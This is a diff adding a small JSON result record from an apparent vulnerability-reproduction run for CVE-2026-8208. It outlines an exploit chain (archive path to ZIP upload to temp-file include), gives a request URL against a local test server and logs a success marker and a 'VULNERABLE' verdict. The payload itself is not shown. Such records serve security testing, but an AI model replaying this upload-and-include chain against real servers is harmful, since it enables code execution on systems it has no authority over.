@@ -1,0 +1,12 @@
+{
+  "case": "CVE-2026-8208",
+  "chain": "archive path -> ZIP upload -> temp include",
+  "archive_id": "6",
+  "uploaded_file": "legit_files/temp/spicy.php_md9qzTRarULbxG0u.zip",
+  "request_url": "http://127.0.0.1:8081/index.php?q=/legit_files/temp/spicy.php_md9qzTRarULbxG0u.zip",
+  "http_status": 200,
+  "response_bytes": 43056,
+  "marker": "TRIDENT_LFI_OK",
+  "marker_observed": true,
+  "result": "VULNERABLE"
+}
